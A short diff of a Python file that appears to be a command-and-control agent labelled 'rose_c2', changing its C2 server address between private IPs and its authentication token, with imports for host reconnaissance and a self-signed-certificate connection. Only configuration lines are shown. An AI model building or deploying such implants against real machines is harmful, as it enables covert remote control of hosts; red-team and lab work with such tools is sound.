@@ -5,10 +5,10 @@ from urllib.parse import urlencode
 
 import platform, os, re, ctypes, getpass, socket, json, urllib, ssl, time
 
-SERVER_URL="https://10.100.1.42:8000/"
+SERVER_URL="https://10.100.1.56:8000/"
 AGENT_NAME="example1"
 AGENT_TYPE="rose_c2"
-AUTH_TOKEN="abc_123"
+AUTH_TOKEN="plaintext_really"
 
 # Allow connection to the server (uses a self signed cert)
 CTX = ssl.create_default_context()
